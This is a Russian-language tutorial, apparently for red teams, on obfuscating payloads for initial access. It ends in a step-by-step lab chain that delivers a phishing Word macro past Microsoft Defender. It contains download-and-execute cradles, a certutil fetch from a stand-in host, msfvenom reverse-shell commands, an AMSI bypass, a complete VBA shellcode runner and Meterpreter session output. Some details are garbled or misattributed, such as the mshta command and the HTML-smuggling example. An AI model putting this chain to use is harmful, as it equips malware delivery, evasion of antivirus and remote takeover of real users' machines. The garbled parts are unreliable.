# Обфускация пейлоада при получении начального доступа

## Контекст и разграничение понятий

Обфускация пейлоада — совокупность методов преобразования вредоносного кода, направленная на сокрытие его семантики и сигнатур от средств защиты при сохранении исходной функциональности. В операциях по получению начального доступа (Initial Access) этот приём решает задачу первого эшелона: обеспечить доставку и выполнение основного агента (импланта, RAT, обратного шелла) через периметровые защитные механизмы — почтовые шлюзы, веб-фильтры, антивирусные сканеры рабочих станций. Согласно матрице MITRE ATT&CK, обфускация файлов и информации классифицируется как техника [T1027](https://attack.mitre.org/techniques/T1027) в тактике «Защита от обнаружения», однако при начальном доступе она неразрывно связана с техникой доставки вредоносных документов [T1566.001](https://attack.mitre.org/techniques/T1566/001) и выполнением кода через скриптовые интерпретаторы [T1059](https://attack.mitre.org/techniques/T1059).

Под «пейлоадом» в этом контексте понимается не только финальный исполняемый артефакт (двоичный файл, DLL), но и промежуточные звенья цепочки атаки: скрипты PowerShell, VBA-макросы, JScript‑вставки, HTML‑страницы. Все они подлежат обфускации, чтобы затруднить статический сигнатурный анализ, динамический эвристический анализ и человеческий разбор.

Важно разграничить обфускацию с близкими по цели, но отличающимися механизмами техниками:

```text
┌─────────────────────┐
│ Кодирование         │ преобразование формы данных (Base64, URL‑encode) без ключа;
│                     │ обратимо тривиальным алгоритмом.
└───────┬─────────────┘
        │
┌───────▼─────────────┐
│ Шифрование          │ криптографическое преобразование с ключом (XOR с ключом,
│                     │ AES, RC4); требует ключа для восстановления.
└───────┬─────────────┘
        │
┌───────▼─────────────┐
│ Упаковка            │ сжатие исполняемого файла упаковщиком (UPX, MPRESS);
│                     │ меняет структуру PE, не меняя логику.
└───────┬─────────────┘
        │
┌───────▼─────────────┐
│ Стеганография       │ сокрытие вредоносных данных внутри безобидного носителя
│                     │ (изображение, аудио); целевой артефакт не читается напрямую.
└─────────────────────┘
```

Перечисленные подходы часто комбинируются. Например, обфускация макросов VBA может содержать фрагменты, закодированные в Base64, и дополнительное XOR‑шифрование, образуя цепочку «обфускация + шифрование + кодирование». Именно поэтому в пентесте привлекательность обфускации заключается в возможности динамически собирать полезную нагрузку непосредственно в памяти целевой системы, минуя статические сигнатуры.

Ниже приведена сравнительная таблица, фиксирующая отличия ключевых понятий:

| Понятие | Цель | Метод | Обратимость | Пример в начальном доступе |
|---------|------|-------|-------------|----------------------------|
| Обфускация кода | Скрыть логику от статического анализатора | Переименование переменных, вставка мусора, изменение потока управления | Высокая; семантика сохраняется, детектирование затруднено | Обфусцированный VBA-макрос с разбиением строк через `ChrW()` |
| Кодирование пейлоада | Превратить бинарный шеллкод в текстовое представление для встраивания | Base64, Hex, URL‑encode | Полностью обратимо без ключа (тривиальное декодирование) | `powershell -EncodedCommand <Base64>` |
| Шифрование пейлоада | Предотвратить чтение даже обученным анализатором | XOR с ключом, AES-256-GCM | Обратимо только при знании ключа/IV | Шеллкод в VBA, расшифровываемый перед вызовом `VirtualAlloc` |
| Упаковка исполняемого файла | Уменьшить размер и изменить статическую сигнатуру EXE/DLL | UPX, ручной компрессор PE-файла | Обратимо специальными распаковщиками при старте | Фишинговый вложенный `.doc`, содержащий упакованный троян‑дроппер |
| Стеганография | Скрыть сам факт наличия вредоносных данных | Встраивание в младшие биты изображения, поля метаданных | Обратимо при знании метода извлечения | HTML‑страница со спрятанным в пикселях PNG-скриптом (техника HTML Smuggling [T1027.006](https://attack.mitre.org/techniques/T1027/006)) |

Практическое разграничение необходимо: студенты часто воспринимают любой Base64 как «шифрование», что некорректно ни с технической, ни с правовой точек зрения. Именно комбинация нескольких преобразований даёт эффект, достаточный для обхода антивирусов в рамках красных команд.

Для иллюстрации минимальной обфускации полезно сопоставить прямолинейный запуск вредоносного скрипта с его обфусцированным вариантом.

```powershell
# Исходный скрипт (легко детектируется по строке "Invoke-Expression")
$payload = 'IEX(New-Object Net.WebClient).DownloadString("http://192.168.1.10/evil.ps1")'
Invoke-Expression $payload
```

Обфусцированные варианты могут заменять `Invoke-Expression` на обращение через точку или конкатенировать строку динамически, а URL кодировать в Base64. В разделе 3 этот подход будет рассмотрен подробнее. Главное — обфускация не меняет логику, но радикально усложняет сопоставление с известными сигнатурами.

Таким образом, обфускация пейлоада на этапе начального доступа — это многослойный процесс, включающий преобразование представления, разбиение на безобидные фрагменты и восстановление непосредственно перед исполнением. Далее мы рассмотрим внутреннее устройство арсенала техник.

## Классификация и арсенал техник обфускации

Рассматриваемая область представляет собой класс методов обфускации, применяемых к различным типам пейлоадов. Выделим основные категории, охватывающие практически все актуальные приёмы, встречающиеся в реальных атаках и пентестах. Структурная визуализация представлена в виде таблицы с указанием индикаторов и примеров.

| Категория | Техника (связь с MITRE) | Механизм | Типичный носитель при начальном доступе | Характерные артефакты / индикаторы |
|-----------|--------------------------|----------|----------------------------------------|-------------------------------------|
| Кодирование | Payload Encoding [T1027.012](https://attack.mitre.org/techniques/T1027/012), Command Obfuscation [T1027.010](https://attack.mitre.org/techniques/T1027/010) | Преобразование байт/строк в безопасный алфавит (Base64, URL-encode, Hex) | PowerShell скрипты, VBA-макросы, HTML/JS | Частые вызовы `FromBase64String()`, `atob()` в JS, параметры команд с `-Enc` |
| Шифрование | Encrypted/Encoded File [T1027.013](https://attack.mitre.org/techniques/T1027/013) | Симметричное шифрование (XOR, RC4, AES) с ключом, встроенным в скрипт | VBA, PowerShell, .NET-сборки | Циклы с XOR по массиву байт, вызовы `AesManaged` или `RC4CryptoServiceProvider` |
| Сжатие и упаковка | Software Packing [T1027.002](https://attack.mitre.org/techniques/T1027/002) | Упаковка PE-файла (UPX) или сжатие скрипта (gzip) перед встраиванием | EXE-дропперы, скрипты с сжатым содержимым | Утилиты `upx`, сигнатуры упаковщиков в бинарном файле; gzip-магические байты в теле скрипта |

| Обфускация через среду выполнения | Command Obfuscation [T1027.010](https://attack.mitre.org/techniques/T1027/010), LOLBAS | Использование легитимных системных утилит для декодирования/загрузки (certutil, bitsadmin, msiexec) | Командные строки ярлыков, пакетные файлы, поля реестра | `certutil -decode`, `bitsadmin /transfer`, `mshta` с закодированным URL |
| Динамическое разрешение API | Dynamic API Resolution [T1027.007](https://attack.mitre.org/techniques/T1027/007) | Ручной поиск адресов функций Kernel32 (GetProcAddress) вместо статического импорта | Шеллкод (рефлективная загрузка DLL), VBA-макросы | Вызовы `DllImport` с последующим `GetProcAddress` через обход IAT, эвристики вызова `VirtualAlloc` |

### Кодирование и шифрование в связке

Самый популярный связочный подход — генерация бинарного шеллкода (например, обратного Meterpreter-шелла), его XOR‑шифрование с одним байтом ключа и последующее кодирование в Base64. Это позволяет вставить «безопасную» строку в VBA-макрос или PowerShell‑скрипт. Дешифрование выполняется в памяти: сначала Base64‑декодирование, затем XOR‑цикл. Пример реализации такого цикла на VBA:

```vb
' Иллюстративная схема дешифрования в VBA
Function DecryptPayload(b64 As String, xorKey As Byte) As Byte()
    Dim raw() As Byte
    raw = DecodeBase64(b64)          ' пользовательская или вызов WinAPI CryptStringToBinary
    Dim i As Long
    For i = LBound(raw) To UBound(raw)
        raw(i) = raw(i) Xor xorKey
    Next
    DecryptPayload = raw
End Function
```

Здесь обфускация достигнута двумя транзакциями: статический анализатор видит лишь Base64‑строку, а XOR-ключ может также генерироваться динамически из окружения (например, сумма байтов имени компьютера). Подобный метод использует [AppleJeus](https://www.volexity.com/blog/2023/03/30/3cx-supply-chain-compromise-leads-to-iconic-incident/), хотя в более криптостойком варианте (AES‑256). При простейшем XOR обход происходит за счёт того, что эвристический эмулятор не выполняет цикл дешифрования, так как ключ не фиксирован в условиях эмуляции.

### Обфускация скриптовой логики

В макросах VBA распространено использование `ChrW()` для построения строк (например, `ChrW(73) & ChrW(69) & ChrW(88)` → `"IEX"`). Добавление «мусорных» операторов, которые никогда не выполняются, но усложняют эмуляцию, — классический приём, описанный в работе Fernandes (2023) по генерации maldocs. Аналогично в JavaScript‑бэкдорах применяется обфускация через переменные‑контейнеры, вычисляемые выражения и белые пробелы. Подобная техника активно использовалась в атаках Sandworm с Industroyer, где код бэкдора был «тяжело обфусцирован» [7].

Пример обфускации PowerShell с использованием конкатенации и преобразования строки в команду:

```powershell
$c = 'IEX'
$d = '(New-Object Net.WebClient).'
$e = 'DownloadString'
$url = "http://" + "192" + ".168" + ".1.10/evil.ps1"
.($c) ($d + $e + '("' + $url + '")')
```

Вызов через `.` вместо `IEX` не генерирует событие скрипт-блок лога с ожидаемой строкой и часто обходит логирование AMSI.

### Использование системных утилит (LOLBAS)

Инструменты `certutil`, `bitsadmin`, `msiexec` позволяют не только загрузить, но и декодировать обфусцированный контент. Техника, входящая в многие фишинговые цепочки, эксплуатирует доверие к подписанным Microsoft утилитам. Пример получения и раскодирования пейлоада на лету:

```cmd
certutil -urlcache -split -f http://phish.example/b64.txt %TEMP%\stage.b64
certutil -decode %TEMP%\stage.b64 %TEMP%\stage.dll
rundll32 %TEMP%\stage.dll, Start
```

Первая строка загружает текстовый файл, содержащий Base64‑представление DLL, вторая декодирует его в PE-файл, третья исполняет. В логах останутся легитимные запуски системных утилит. Этот подход — яркий пример комбинации обфускации и LOLBAS, широко освещённый в отчётах MITRE и SOC-исследованиях.

Таким образом, классификация демонстрирует, что обфускация пейлоада — не монолитная техника, а комбинаторное пространство методов, адаптируемых под конкретный вектор доставки. В следующем разделе мы перейдём к практическим инструментам пентестера и рабочему процессу.

## Применение обфускации в пентесте: инструменты и рабочий процесс

В работе пентестера обфускация встраивается в цикл подготовки полезной нагрузки. Типичная последовательность: выбор типа импланта → генерация сырого пейлоада → выбор и применение методов обфускации → упаковка в носитель (документ, ярлык, HTML) → тестирование на стенде с актуальными средствами защиты → доставка. Ниже рассмотрены ключевые инструменты и конкретные команды.

### Генерация и начальное кодирование

Фреймворк Metasploit предоставляет встроенные кодировщики (`-e`), например, `x86/shikata_ga_nai` — полиморфный XOR‑кодировщик с самомодифицирующимся декодером. Он генерирует множество вариантов, затрудняя статическое детектирование. Пример создания обратного Meterpreter-шелла для целевой Windows‑архитектуры x64:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.100 LPORT=443 \
  -e x64/xor_dynamic -i 3 -f raw -o payload.bin
```

Ключ `-i 3` означает трёхкратное применение кодировщика, каждый раз с новым XOR‑ключом, что усложняет сигнатуры. Выходной файл `payload.bin` — бинарный массив.

Для встраивания в офисные макросы обычно требуется текстовое представление — Base64. Можно получить его стандартной командой:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.bin"))
```

Однако простое Base64 легко выделяется средствами защиты (Defender, ATP). Поэтому следующий этап — дополнительная обфускация.

### Обфускаторы скриптов и макросов

Для PowerShell незаменим модуль [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) Дэниэла Бохэннона. Он позволяет замусорить AST‑дерево, преобразовать имена команд, вставить незначащие символы, использовать альтернативные методы вызова. Пример тривиальной команды, преобразованной в обфусцированный скрипт:

```powershell
# Исходная:
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://a/b')
# Один из возможных выводов Invoke-Obfuscation (фрагмент иллюстративный)
.("{0}{1}"-f 'In','voke-Ex','pression') `
  ("{2}{3}{0}{1}"-f 'w-','Object','Ne','w')."D`ownload`String"('http'+'://a/b')
```

Применение позволяет обойти статические сигнатуры, которые ищут строку `Invoke-Expression` или `WebClient.DownloadString`. Для VBA‑макросов существуют генераторы, вроде [macro_pack](https://github.com/sevagas/macro_pack), способный создавать обфусцированный код с динамическим вызовом WinAPI и дешифровкой шеллкода. Команда для создания готового документа Word с имплантом:

```bash
echo "payload.bin" | macro_pack.exe -t SHELLCODE -o malicious.docm -G ms-word --obfuscation
```

Здесь `--obfuscation` активирует встроенные методы: замена строк на ChrW, вставка «мусорных» процедур, динамическое разрешение адресов `VirtualAlloc` и `CreateThread` через `DllCall`.

### Работа с LOLBAS и обход AMSI

При доставке через фишинговые письма часто используется документ, загружающий внешний скрипт. В таких случаях полезен `mshta`, выполняющий скрипт с удалённого URL, но содержимое скрипта может быть прозрачно закодировано в самом вызове:

```cmd
mshta.exe "javascript:var s='<Base64-код>';eval(new ActiveXObject('Scripting.FileSystemObject')
  .OpenTextFile(s,1).ReadAll());close();"
```

Однако PowerShell‑исполнение часто натыкается на Antimalware Scan Interface (AMSI), который передаёт скрипт на анализ до выполнения. Техники обхода AMSI включают патчинг AmsiScanBuffer в памяти, подмену контекста сессии или использование нестандартных сборок. Иллюстративная команда на PowerShell для обхода через отражение (популярный метод, но быстро детектируемый современными EDR):

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

В реальном пентесте такие строчки также обфусцируются (через конкатенацию строк, динамическое получение типа), чтобы избежать немедленного обнаружения.

### Цепочка проверки на стенде

Неотъемлемая часть работы — верификация обхода. Пентестер запускает сгенерированный артефакт на изолированной машине с антивирусом (Defender, сторонний) и мониторит логи. Команда для проверки счета на VirusTotal через API (их выдержка опущена, но суть — автоматическая отправка хэша сгенерированного документа). Важно, что в реальной операции артефакт не должен появляться в публичных облаках, иначе сигнатуры быстро появятся. На стенде же допустимо.

Пример проверки с использованием локального Defender:

```powershell
# Сохраняем файл в исключённую папку, затем сканируем вручную
Start-MpScan -ScanPath .\malicious.docm -ScanType CustomScan
```

Пока угроза не детектирована, можно считать обфускацию успешной. Однако с обновлением сигнатур это может измениться, поэтому красные команды используют одноразовые, уникальные обфусцированные экземпляры.

В следующем разделе мы пройдём сквозной пример от генерации до получения сессии, объединив все рассмотренные методы.

## Сквозной практический пример: обфусцированный макрос с доставкой через фишинг

**Исходные условия.** Лабораторный стенд: атакующая машина Kali Linux (192.168.56.1), жертва — Windows 10 22H2 с Microsoft Defender в активном режиме, Office 365. Цель — получить интерактивный сеанс Meterpreter, обойдя Defender с помощью макроса Word, полученного по фишинговому письму. Предполагается, что пользователь включит макросы, следуя социальной инженерии.

**Шаг 1. Генерация бинарного пейлоада.** Создаём 64‑битный Meterpreter reverse TCP без кодировщика — обфускацию выполним вручную.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=443 \
  -f raw -o shellcode.bin
```

**Шаг 2. Обфускация шеллкода: XOR с ключом и Base64.** Для исключения детектирования сырого шеллкода при статическом анализе макроса применяем XOR с ключом 0xAA и кодирование.

```python
import base64

with open('shellcode.bin', 'rb') as f:
    raw = bytearray(f.read())
key = 0xAA
xored = bytearray(b ^ key for b in raw)
b64 = base64.b64encode(bytes(xored)).decode('utf-8')
with open('payload.txt', 'w') as out:
    out.write(b64)
```

Теперь `payload.txt` содержит строку вроде (значения иллюстративны):

```
qK/Pz8/P... (Base64 строка)
```

**Шаг 3. Создание VBA‑макроса с расшифровкой и выполнением.** Вставим макрос в документ Word. Он будет содержать функции для декодирования Base64, цикла XOR и вызова шеллкода через `VirtualAlloc`/`CreateThread`. Для маскировки строк используем `ChrW`, добавим мусорные проверки.

```vb
' Иллюстративный макрос (упрощён для статьи)
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, _
    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, _
    ByVal src As LongPtr, ByVal dwSize As Long) As LongPtr

Function Base64Decode(ByVal b64 As String) As Byte()
    ' ... вызов CryptStringToBinaryA – опущен для краткости
End Function

Sub AutoOpen()
    Dim b64 As String
    b64 = ChrW(81) & ChrW(75) & "..." ' результат из payload.txt, преобразованный в ChrW
    Dim key As Byte
    key = &HAA
    Dim enc() As Byte, dec() As Byte
    enc = Base64Decode(b64)
    ReDim dec(UBound(enc))
    Dim i As Long
    For i = LBound(enc) To UBound(enc)
        dec(i) = enc(i) Xor key
    Next
    
    ' Выделение памяти с правами выполнения
    Dim adr As LongPtr
    adr = VirtualAlloc(0, UBound(dec) + 1, &H3000, &H40)
    ' Копирование шеллкода
    RtlMoveMemory adr, VarPtr(dec(LBound(dec))), UBound(dec) + 1
    ' Создание потока
    CreateThread 0, 0, adr, 0, 0, 0
End Sub
```

Строка `b64` в реальном коде занимает тысячи символов, разбитых через `ChrW` и конкатенацию. Макрос можно дополнительно запутать, добавив неиспользуемые переменные и вызовы функций. Полученный документ сохраняем как `invoice.docm`.

**Шаг 4. Настройка обработчика Metasploit и имитация доставки.** На атакующей машине запускаем listener.

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
  set LHOST 192.168.56.1; set LPORT 443; set ExitOnSession false; run -j"
```

После отправки письма и открытия документа пользователем (включены макросы) срабатывает `AutoOpen`. Макрос расшифровывает шеллкод, выделяет исполняемую память и запускает поток.

```bash
[*] Started reverse TCP handler on 192.168.56.1:443
[*] Sending stage (200262 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.1:443 -> 192.168.56.101:49832)
```

**Шаг 5. Подтверждение доступа.** После получения сессии можно выполнить базовые проверки, чтобы продемонстрировать успешное проникновение.

```text
meterpreter > getuid
Server username: CORP\jsmith
meterpreter > sysinfo
Computer        : WS01
OS              : Windows 10 (10.0 Build 19045).
```

Таким образом, несмотря на активный Defender, обфускация пейлоада (XOR + Base64) и обфускация макроса (ChrW, динамический вызов API) позволили выполнить произвольный код. На практике перед целевой операцией документ тестируется и, при необходимости, дорабатывается (добавление обхода AMSI, проверок среды).

Этот пример иллюстрирует, что успешность обфускации определяется не одним приёмом, а их слоистой комбинацией, проверенной на актуальных защитных решениях.
